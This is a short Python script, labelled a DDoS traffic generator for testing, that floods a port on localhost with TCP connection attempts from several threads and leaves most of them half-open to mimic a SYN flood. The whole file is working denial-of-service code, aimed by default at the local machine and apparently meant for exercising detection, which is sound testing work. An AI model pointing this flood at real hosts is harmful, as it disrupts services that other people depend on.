#!/usr/bin/env python3
"""
Enhanced DDoS Traffic Generator for Testing
"""
import socket
import threading
import time
import random
import sys

def generate_syn_flood(target_ip="127.0.0.1", target_port=2703, duration=60, rate_limit=500):
    """Generate aggressive SYN flood attack"""
    print(f"Starting aggressive SYN flood to {target_ip}:{target_port} (rate: {rate_limit} pps)")
    end_time = time.time() + duration
    packet_count = 0
    
    while time.time() < end_time:
        try:
            # Much larger burst size for aggressive attack
            burst_size = min(rate_limit, 100)  # Increased from 20
            for i in range(burst_size):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.001)  # Much shorter timeout
                    # Use random source ports for variety
                    source_port = random.randint(1024, 65535)
                    sock.bind(('', source_port))
                    sock.connect_ex((target_ip, target_port))
                    # Don't close socket immediately - leave connections hanging
                    # This creates incomplete handshakes typical of SYN floods
                    packet_count += 1
                    
                    # Only close some connections to create asymmetric patterns
                    if random.random() < 0.3:  # Close only 30% of connections
                        sock.close()
                        
                except Exception:
                    packet_count += 1
                    continue
            
            # Minimal sleep for high rate attack
            time.sleep(0.02)  # Much shorter sleep for aggressive attack
            
        except KeyboardInterrupt:
            break
        except Exception:
            continue
    
    print(f"Aggressive SYN flood completed: {packet_count} connection attempts")
    return packet_count

def generate_controlled_traffic(duration=120, target_ports=None, rate_per_port=400):
    """Generate aggressive traffic patterns"""
    if target_ports is None:
        target_ports = [2703]  # Focus on your target port
    
    print(f"Starting aggressive traffic generation for {duration}s...")
    print(f"Target ports: {target_ports}, Rate per port: {rate_per_port} pps")
    
    threads = []
    
    # Multiple threads per port for higher volume attack
    for port in target_ports:
        for thread_num in range(3):  # 3 threads per port for aggressive attack
            t = threading.Thread(
                target=generate_syn_flood,
                args=("127.0.0.1", port, duration, rate_per_port)
            )
            threads.append(t)
    
    # Start all threads
    for t in threads:
        t.start()
    
    # Wait for completion
    for t in threads:
        t.join()

def main():
    duration = 60
    if len(sys.argv) > 1:
        try:
            duration = int(sys.argv[1])
        except ValueError:
            print("Invalid duration, using default 60 seconds")
            duration = 60
    
    print(f"Starting aggressive DDoS simulation for {duration} seconds...")
    
    # Generate aggressive traffic focusing on target port
    generate_controlled_traffic(duration, target_ports=[2703], rate_per_port=400)
    
    print("Aggressive DDoS simulation completed")

if __name__ == "__main__":
    main()